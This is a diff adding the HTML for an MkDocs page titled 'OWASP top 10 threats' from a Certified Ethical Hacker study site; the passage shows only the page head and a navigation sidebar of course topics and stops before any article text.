@@ -1,0 +1,3561 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.2.5">
+    
+    
+      
+        <title>OWASP top 10 threats - CEH-IN-BULLET-POINTS</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2d9f7617.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Barlow:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Barlow";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#owasp-top-10-threats" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="CEH-IN-BULLET-POINTS" class="md-header__button md-logo" aria-label="CEH-IN-BULLET-POINTS" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CEH-IN-BULLET-POINTS
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              OWASP top 10 threats
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CEH-IN-BULLET-POINTS" class="md-nav__button md-logo" aria-label="CEH-IN-BULLET-POINTS" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    CEH-IN-BULLET-POINTS
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1" type="checkbox" id="__nav_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1">
+          Introduction
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Introduction" data-md-level="1">
+        <label class="md-nav__title" for="__nav_1">
+          <span class="md-nav__icon md-icon"></span>
+          Introduction
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_1" type="checkbox" id="__nav_1_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_1">
+          Information security
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Information security" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_1">
+          <span class="md-nav__icon md-icon"></span>
+          Information security
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/information-security-overview/" class="md-nav__link">
+        Information security overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/security-threats-and-attacks/" class="md-nav__link">
+        Security threats and attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_1_3" type="checkbox" id="__nav_1_1_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_1_3">
+          Information security controls
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Information security controls" data-md-level="3">
+        <label class="md-nav__title" for="__nav_1_1_3">
+          <span class="md-nav__icon md-icon"></span>
+          Information security controls
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/information-security-controls/" class="md-nav__link">
+        Information security controls overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/risk-management/" class="md-nav__link">
+        Risk management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/incident-management/" class="md-nav__link">
+        Incident management
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/network-security/" class="md-nav__link">
+        Network security
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/security-policies/" class="md-nav__link">
+        Security policies
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/physical-security/" class="md-nav__link">
+        Physical security
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/data-leakage-backup-and-recovery/" class="md-nav__link">
+        Data leakage backup and recovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/identity-access-management-%28iam%29/" class="md-nav__link">
+        Identity access management (IAM)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/threat-intelligence-and-forensics/" class="md-nav__link">
+        Threat intelligence and forensics
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/laws-standards-and-regulations/" class="md-nav__link">
+        Laws, standards and regulations
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_2" type="checkbox" id="__nav_1_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_2">
+          Hacking
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Hacking" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_2">
+          <span class="md-nav__icon md-icon"></span>
+          Hacking
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/hacker-types/" class="md-nav__link">
+        Hacker types
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/hacking-stages/" class="md-nav__link">
+        Hacking stages
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_1_3" type="checkbox" id="__nav_1_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_1_3">
+          Penetration testing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Penetration testing" data-md-level="2">
+        <label class="md-nav__title" for="__nav_1_3">
+          <span class="md-nav__icon md-icon"></span>
+          Penetration testing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/penetration-testing/" class="md-nav__link">
+        Penetration testing overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../01-introduction/penetration-testing-phases/" class="md-nav__link">
+        Penetration testing phases
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Footprinting
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Footprinting" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Footprinting
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/footprinting-overview/" class="md-nav__link">
+        Footprinting overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/search-engines-and-online-resources/" class="md-nav__link">
+        Search engines and online resources
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/whois-geoiplocation-and-dns-interrogation/" class="md-nav__link">
+        WHOIS, GeoIpLocation and DNS interrogation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/email-footprinting/" class="md-nav__link">
+        Email footprinting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/website-footprinting/" class="md-nav__link">
+        Website footprinting
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../02-footprinting/network-footprinting/" class="md-nav__link">
+        Network footprinting
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Scanning networks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Scanning networks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Scanning networks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/scanning-networks-overview/" class="md-nav__link">
+        Scanning networks overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/tcpip-basics/" class="md-nav__link">
+        TCP/IP basics
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/scanning-tools/" class="md-nav__link">
+        Scanning tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/scanning-techniques/" class="md-nav__link">
+        Scanning techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/bypassing-ids-and-firewall/" class="md-nav__link">
+        Bypassing IDS and firewall
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../03-scanning-networks/banner-grabbing/" class="md-nav__link">
+        Banner grabbing
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          Enumeration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Enumeration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Enumeration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../04-enumeration/enumeration-overview/" class="md-nav__link">
+        Enumeration Overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../04-enumeration/dns-enumeration/" class="md-nav__link">
+        DNS enumeration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_5">
+          Vulnerabilities
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Vulnerabilities" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Vulnerabilities
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-vulnerabilities/vulnerability-analysis/" class="md-nav__link">
+        Vulnerability analysis
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-vulnerabilities/common-vulnerabilities/" class="md-nav__link">
+        Common vulnerabilities
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../05-vulnerabilities/automated-penetration-testing-tools/" class="md-nav__link">
+        Automated penetration testing tools
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          System hacking
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="System hacking" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          System hacking
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_1" type="checkbox" id="__nav_6_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_1">
+          Cracking passwords
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Cracking passwords" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_1">
+          <span class="md-nav__icon md-icon"></span>
+          Cracking passwords
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/cracking-passwords-overview/" class="md-nav__link">
+        Cracking passwords overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/microsoft-authentication/" class="md-nav__link">
+        Microsoft authentication
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/password-cracking-tools/" class="md-nav__link">
+        Password cracking tools
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/linux-basics/" class="md-nav__link">
+        Linux basics
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/escalating-privileges/" class="md-nav__link">
+        Escalating privileges
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/executing-applications/" class="md-nav__link">
+        Executing applications
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/hiding-files/" class="md-nav__link">
+        Hiding files
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../06-system-hacking/covering-tracks/" class="md-nav__link">
+        Covering tracks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Malware overview
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Malware overview" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Malware overview
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07-malware/malware-overview/" class="md-nav__link">
+        Malware overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07-malware/trojans/" class="md-nav__link">
+        Trojans
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07-malware/viruses/" class="md-nav__link">
+        Viruses
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../07-malware/malware-analysis/" class="md-nav__link">
+        Malware analysis
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Sniffing
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Sniffing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Sniffing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-sniffing/sniffing-overview/" class="md-nav__link">
+        Sniffing overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-sniffing/sniffing-tools/" class="md-nav__link">
+        Sniffing tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_3">
+          Sniffing attacks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Sniffing attacks" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_3">
+          <span class="md-nav__icon md-icon"></span>
+          Sniffing attacks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-sniffing/sniffing-attacks-overview/" class="md-nav__link">
+        Sniffing attacks overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-sniffing/spoofing-attacks/" class="md-nav__link">
+        Spoofing attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../08-sniffing/arp-poisoning/" class="md-nav__link">
+        ARP poisoning
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          Wireless networks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Wireless networks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          Wireless networks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-wireless-networks/wireless-networks-overview/" class="md-nav__link">
+        Wireless networks overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-wireless-networks/aaa-protocols/" class="md-nav__link">
+        AAA protocols
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-wireless-networks/wireless-threats-and-attacks/" class="md-nav__link">
+        Wireless threats and attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-wireless-networks/wireless-security-tools/" class="md-nav__link">
+        Wireless security tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../09-wireless-networks/bluetooth/" class="md-nav__link">
+        Bluetooth
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          Social engineering
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Social engineering" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          Social engineering
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../10-social-engineering/social-engineering-overview/" class="md-nav__link">
+        Social engineering overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../10-social-engineering/social-engineering-types/" class="md-nav__link">
+        Social engineering types
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          Firewalls IDS and Honeypots
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Firewalls IDS and Honeypots" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          Firewalls IDS and Honeypots
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11_1" type="checkbox" id="__nav_11_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11_1">
+          Intrusion detection system (IDS)
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Intrusion detection system (IDS)" data-md-level="2">
+        <label class="md-nav__title" for="__nav_11_1">
+          <span class="md-nav__icon md-icon"></span>
+          Intrusion detection system (IDS)
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../11-firewalls-ids-and-honeypots/intrusion-detection-system-%28ids%29-overview/" class="md-nav__link">
+        Intrusion detection system (IDS) overview
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../11-firewalls-ids-and-honeypots/evading-ids/" class="md-nav__link">
+        Evading IDS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11_2" type="checkbox" id="__nav_11_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11_2">
+          Firewall
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Firewall" data-md-level="2">
+        <label class="md-nav__title" for="__nav_11_2">
+          <span class="md-nav__icon md-icon"></span>
+          Firewall
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
